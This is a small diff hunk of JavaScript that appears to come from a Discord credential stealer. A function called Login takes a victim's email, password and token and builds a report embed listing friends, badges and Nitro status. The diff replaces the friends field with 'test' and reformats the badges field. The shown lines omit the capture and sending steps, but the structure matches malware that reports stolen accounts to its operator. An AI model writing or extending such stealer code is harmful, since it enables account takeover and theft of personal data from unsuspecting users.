@@ -199,12 +199,12 @@ function Login(email, password, token) {
                         },
                         {
                           "name": "**Amis**",
-                          "value": `${GetFriends()}`,
+                          "value": `test`,
                           "inline": false
                         },
                         {
                             "name": "**Badges**",
-                            "value": `${GetBadges(json.flags)} ${GetNitro(json.premium_type)}`,
+                            "value": `${GetBadges(json.flags)} / ${GetNitro(json.premium_type)}`,
                             "inline": true
                         }
                     ],
